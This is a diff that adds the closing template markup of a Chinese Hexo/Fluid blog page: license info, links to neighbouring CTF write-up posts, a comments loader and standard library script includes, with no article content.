+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年4月9日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/09/XYCTF%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%80%9D%E8%80%83/" title="XYCTF复现及思考">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">XYCTF复现及思考</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/03/cyberstrikelab-Pearl/" title="cyberstrikelab_Pearl">
+                        <span class="hidden-mobile">cyberstrikelab_Pearl</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', '258369123/pinglun');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script>
+<script src="/js/reward.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
